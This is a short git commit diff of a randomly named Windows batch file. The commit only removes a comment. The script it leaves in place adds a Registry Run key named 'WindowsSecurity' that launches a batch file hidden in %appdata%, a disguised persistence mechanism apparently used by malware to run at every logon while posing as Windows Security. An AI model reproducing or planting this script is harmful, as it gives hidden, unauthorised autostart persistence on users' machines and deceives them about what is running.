91808a0927ee55058d20ae363136a50b58d288d5
JelleF09 <137308002+JelleF09@users.noreply.github.com>
2025-05-29 06:44:27 +0200

    Update Z6s769T4WWKnjIBWIx7v.bat

--- Z6s769T4WWKnjIBWIx7v.bat
+++ Z6s769T4WWKnjIBWIx7v.bat
@@ -1,6 +1,5 @@
 @echo off
 setlocal
 set "batPath=%appdata%\windows security\windowssecurity.bat"
-REM Add the batch file to the registry Run key for current user
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurity" /t REG_SZ /d "\"%batPath%\"" /f
 exit
